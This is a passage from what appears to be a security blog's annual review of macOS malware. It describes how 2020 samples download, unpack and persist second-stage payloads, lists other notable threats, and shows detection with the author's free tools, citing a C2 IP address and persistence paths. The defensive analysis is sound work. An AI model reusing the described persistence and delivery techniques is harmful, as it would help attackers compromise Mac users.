</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>     ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>     <span style="color:#a6e22e">scheduleMac</span>(<span style="color:#a6e22e">fname</span>,<span style="color:#a6e22e">agentTask</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>     }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>    });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>}</span></span></code></pre></div>
<p>After appending <code>.zip</code>, the malware extracts the downloaded (zip) file to the location specified in the <code>loclpth</code> variable (<code>~/Library/Application Support/SCloud</code>). Once extracted it invokes a function we discussed earlier <code>scheduleMac</code>  &hellip;which persists (as a cronjob) and launches the downloaded payload.</p>
<p>Unfortunately the remote servers (e.g. <code>download.strongbox.in</code>) are now offline, and as such, the 2nd stage payloads are not available for analysis.</p>
<br>
<h3 id="-and-all-others">üëæ And All Others</h3>
<p>This blog post provided a comprehensive technical analysis of the new mac malware of 2020. However it did not cover adware or malware from previous years. Of course, this is not to say such items are unimportant &hellip;especially when such adware is notarized (to bypass Apple&rsquo;s new security checks), or when existing malware is updated.</p>
<p>As such, here we include a list (and links to detailed writeups) of other notable items from 2020, for the interested reader.</p>
<ul style="list-style-type:square;">
  <li>
<p>üëæ <code>Shlayer</code> / <code>Vindinstaller</code> Dropper</p>
<p>In June, Intego researchers uncovered:</p>
  <blockquote>
  "...a new [adware dropper] in the wild, actively spreading through malicious results in Google searches.
<p>Intego identifies the [adware dropper] as unique new variants of OSX/Shlayer (the original variant of which was first discovered by Intego in 2018) and OSX/Bundlore (with similarities to past versions of OSX/MacOffers and Mughthesec/BundleMeUp/Adload)&quot; -Intego</p>
  </blockquote>
<img src="../images/blog/blog_0x5F/shlayer.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Adware Dropper (credit: Intego)</center>

<p>Writeup(s):
<br>
¬† &ldquo;<a href="https://www.intego.com/mac-security-blog/new-mac-malware-reveals-google-searches-can-be-unsafe/">New Mac malware reveals Google searches can be unsafe</a>&rdquo;
<br>
¬† &ldquo;<a href="https://www.sentinelone.com/blog/how-a-new-macos-malware-dropper-delivers-vindinstaller-adware/">How a New macOS Malware Dropper Delivers VindInstaller Adware</a>&rdquo;</p>
  </li>
  <br>
  <li>
<p>üëæ <code>OSX.GMERA</code> (new campaign)</p>
<p>In July, ESET researchers lured GMERA malware operators &ldquo;<em>to remotely control their Mac honeypots</em>&rdquo;.</p>
  <blockquote>
  "To learn more about the intentions of this group, we set up honeypots where we monitored all interactions between the GMERA reverse shell backdoors and the operators of this malware." -ESET
  </blockquote>
<img src="../images/blog/blog_0x5F/GMERA.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">GMERA (run.sh) (credit: ESET)</center>

<p>We covered <code>OSX.GMERA</code> in our &ldquo;<a href="https://objective-see.com/blog/blog_0x53.html">Mac malware of 2019 report</a>&rdquo;, although ESET researchers report is noteworthy (in the context of 2020), as they uncovered a new campaign leveraging this malware.</p>
<p>Writeup:
<br>
¬† &ldquo;<a href="https://www.welivesecurity.com/2020/07/16/mac-cryptocurrency-trading-application-rebranded-bundled-malware/">Mac cryptocurrency trading application rebranded, bundled with malware</a>&rdquo;</p>
  </li>
  <br>
  <li>
  üëæ Notarized Adware
<p>In August, <a href="https://twitter.com/PokeCaptain">Peter Dantini</a> (@PokeCaptain) noticed that the website <code>homebrew.sh</code> (not to be confused with the legitimate Homebrew website <a href="%60brew.sh%60">brew.sh</a>), was hosting an active adware campaign</p>
<p>&hellip;and that the adware has been notarized (read: approved) by Apple:</p>
<img src="../images/blog/blog_0x5F/notarized.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Notarized Adware</center>

<p>This means even on Big Sur, the adware will (still) be allowed to run!</p>
<p>In Apple&rsquo;s own words, notarization was supposed to &ldquo;<i>give users more confidence that [software] &hellip;has been checked by Apple for malicious components.</i>&rdquo; &hellip;maybe not?</p>
<p>Writeup:
<br>
¬† &ldquo;<a href="https://objective-see.com/blog/blog_0x4E.html">Apple Approved Malware</a>&rdquo;</p>
  </li>
  <br>
  <li>
<p>üëæ <code>Bundalor</code> Dropper</p>
<p>In November, SentinelOne researchers published a report on an adware installer that (ab)used resource forks to store its malicious payloads.</p>
<p>&hellip;the adware installer also provided user-instructions to &ldquo;bypass&rdquo; macOS&rsquo;s latest malware mitigations (e.g. notarization):</p>
<img src="../images/blog/blog_0x5F/fork.jpg"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Adware Dropper (credit: SentinelOne)</center>

<p>Writeup:
<br>
¬† &ldquo;<a href="https://labs.sentinelone.com/resourceful-macos-malware-hides-in-named-fork/">Resourceful macOS Malware Hides in Named Fork</a>&rdquo;</p>
  </li>
  <br>
  <li>
<p>üëæ <code>OSX.OceanLotus</code> (new variant)</p>
<p>Also in November, TrendMicro researchers discovered a backdoor that they tied to the OceanLotus Group. Upon closer analysis, the application (which masquerades as Office documents) appears to be an updated variant of <code>OSX.OceanLotus.F</code>:</p>
 <blockquote>
  "Due to similarities in dynamic behavior and code with previous OceanLotus samples, it was confirmed to be a variant of the said malware [OSX.OceanLotus.F]" -TrendMicro
  </blockquote>
<img src="../images/blog/blog_0x5F/oceanLotus.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OceanLotus (credit: TrendMicro)</center>

<p>Writeup:
<br>
¬† &ldquo;<a href="https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html">New MacOS Backdoor Connected to OceanLotus Surfaces</a>&rdquo;</p>
  </li>
</ul>
<h3 id="detections">Detections</h3>
<p>New malware is notoriously difficult to detect via traditional signature-based approaches &hellip;as, well, it&rsquo;s new! A far better approach is to leverage heuristics or behaviors, that can detect such malware, even with no a priori knowledge of the specific (new) threats.</p>
<p>For example, imagine you open an Office Document that (unbeknownst to you) contains an exploit or malicious macros which installs a persistent backdoor. This is clearly an unusual behavior, that should be detected and alerted upon.</p>
<p>Good news, our free macOS security tools do not leverage signatures, but instead monitor for such (unusual, and likely malicious) behaviors.
This allows them to detect and alert on various behaviors of all the new malware of 2020 (with no prior knowledge of the malware).</p>
<p>For example, let&rsquo;s look at how <code>OSX.Dacls</code> was be detected by our free tools:</p>
<ul>
<li>
<p><a href="https://objective-see.com/products/blockblock.html">BlockBlock</a> readily detects when the malware&rsquo;s attempts to persist as a launch item (<code>com.aex-loop.agent.plist</code> ‚Üí <code>~/Library/.mina</code>):
<br><br>
<img src="../images/blog/blog_0x57/BlockBlock.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
</li>
<li>
<p><a href="https://objective-see.com/products/lulu.html">LuLu</a> detects the malware&rsquo;s unauthorized network communications to the attackers&rsquo; remote command &amp; control server (<code>~/Library/.mina</code> ‚Üí <code>67.43.239.146</code>):
<br><br>
<img src="../images/blog/blog_0x57/LuLu.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
</li>
<li>
<p><a href="https://objective-see.com/products/knockknock.html">KnockKnock</a> can scan a system and generically if it is infected with <code>OSX.Dacls</code>, by detecting its launch item persistence (<code>com.aex-loop.agent.plist</code> ‚Üí <code>~/Library/.mina</code>):
<br><br>
<img src="../images/blog/blog_0x57/KnockKnock.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
</li>
</ul>
<p>Recall that <code>OSX.EvilQuest</code> would ransom a user&rsquo;s files. Well good news, our <a href="https://objective-see.com/products/ransomwhere.html">RansomWhere?</a> utility could both detect and stop this malicious behavior in its tracks:</p>
<img src="../images/blog/blog_0x59/ransomwhere.png"  width="50%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>The other new malware samples are similarly detected when they persist, generate an unauthorized network connection, or perform other malicious actions.</p>
<div class="note">
For more information about our free tools, see:
<br><br>
<center>
  <a class="inlineLink" href="https://objective-see.com/products.html">Objective-See's Tools</a>.
</center>
</div>
<h3 id="conclusion">Conclusion:</h3>
<p>Well that&rsquo;s a wrap! Thanks for joining our &ldquo;journey&rdquo; as we wandered through the macOS malware of 2020.</p>
<p>With the continued growth and popularity of macOS (especially in the enterprise!), 2021 will surely bring a bevy of new macOS malware.
<br>&hellip;so, stay safe out there!</p>
<p>And if you&rsquo;d like to learn more about macOS malware and malware analysis techniques, I&rsquo;ve written an entire (free) book on this very topic:</p>
<center>
  üìö <a class="inlineLink" href="https://taomm.org">The Art Of Mac Malware, Vol. 0x1: Analysis</a>
</center>
<br><br>
<div class="border">
  <span class="n3rdFont">
    <div align="center">
      <br>
      Love these blog posts? <br>
      Support my tools &amp; writing on <a class="inlineLink" href="https://www.patreon.com/bePatron?c=701171"><span class="n3rdFont">patreon</span></a> :)
    </div>
    <br><br>
    <span>
      <a class="inlineLink" href="https://www.patreon.com/bePatron?c=701171">
        <img src="https://objective-see.com/patreon/images/patreon.jpg" width="700" style="display:block; margin:auto;"/>
      </a>
    </span>
    <br>
  </span>
</div>
</section>
</div>
</body>
</html>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> ¬ª
        </div>
    </li>

</ul>
</nav>

  </body>
</html>